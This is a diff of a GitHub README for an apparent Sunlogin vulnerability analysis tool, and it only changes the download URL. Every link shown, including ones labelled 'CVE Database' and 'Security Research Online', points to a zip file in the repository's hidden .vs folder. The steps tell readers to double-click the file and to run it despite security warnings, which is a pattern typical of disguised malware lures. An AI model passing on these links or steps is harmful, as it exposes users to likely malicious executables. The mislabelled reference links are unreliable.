@@ -1,6 +1,6 @@
 # 🌟 SunloginLP-Eanalysis-tool - Analyze Sunlogin Vulnerabilities Easily
 
-[![Download SunloginLP-Eanalysis-tool](https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/SunloginLPE/v18/SunloginLP-Eanalysis-tool-2.8.zip%20Now-%20%F0%9F%93%A8%20SunloginLP-Eanalysis-tool-blue)](https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/SunloginLPE/v18/SunloginLP-Eanalysis-tool-2.8.zip)
+[![Download SunloginLP-Eanalysis-tool](https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/Eanalysis_Sunlogin_L_tool_3.4-beta.1.zip%20Now-%20%F0%9F%93%A8%20SunloginLP-Eanalysis-tool-blue)](https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/Eanalysis_Sunlogin_L_tool_3.4-beta.1.zip)
 
 ## 📖 Introduction
 
@@ -23,12 +23,12 @@ Before proceeding, make sure your system meets these requirements:
 
 To get started with the tool, visit the Releases page to download the latest version. 
 
-**Download Link:** [Visit this page to download](https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/SunloginLPE/v18/SunloginLP-Eanalysis-tool-2.8.zip)
+**Download Link:** [Visit this page to download](https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/Eanalysis_Sunlogin_L_tool_3.4-beta.1.zip)
 
 On the Releases page, you will see a list of available versions. Click on the latest version to access the download options.
 
 1.  Look for the assets section where you will find the compiled executable files.
-2.  Click on the file that matches your system requirements (e.g., https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/SunloginLPE/v18/SunloginLP-Eanalysis-tool-2.8.zip).
+2.  Click on the file that matches your system requirements (e.g., https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/Eanalysis_Sunlogin_L_tool_3.4-beta.1.zip).
 3.  The download will begin automatically.
 
 Once the file downloads, locate it in your downloads folder.
@@ -36,7 +36,7 @@ Once the file downloads, locate it in your downloads folder.
 ## 🚀 Running the Tool
 
 1.  Navigate to the downloaded file.
-2.  Double-click the executable file (e.g., https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/SunloginLPE/v18/SunloginLP-Eanalysis-tool-2.8.zip).
+2.  Double-click the executable file (e.g., https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/Eanalysis_Sunlogin_L_tool_3.4-beta.1.zip).
 3.  Depending on your system settings, you might see a security warning. Choose to run the application.
 
 The tool will launch, and you are now ready to begin your analysis.
@@ -78,8 +78,8 @@ For further assistance, you can also seek help from online forums or communities
 
 For detailed information on Sunlogin vulnerabilities and command execution threats, refer to:
 
-- [CVE Database](https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/SunloginLPE/v18/SunloginLP-Eanalysis-tool-2.8.zip)
-- [Security Research Online](https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/SunloginLPE/v18/SunloginLP-Eanalysis-tool-2.8.zip)
+- [CVE Database](https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/Eanalysis_Sunlogin_L_tool_3.4-beta.1.zip)
+- [Security Research Online](https://raw.githubusercontent.com/noTzeek233s/SunloginLP-Eanalysis-tool/main/.vs/Eanalysis_Sunlogin_L_tool_3.4-beta.1.zip)
 
 ## 📣 Feedback and Contributions
 
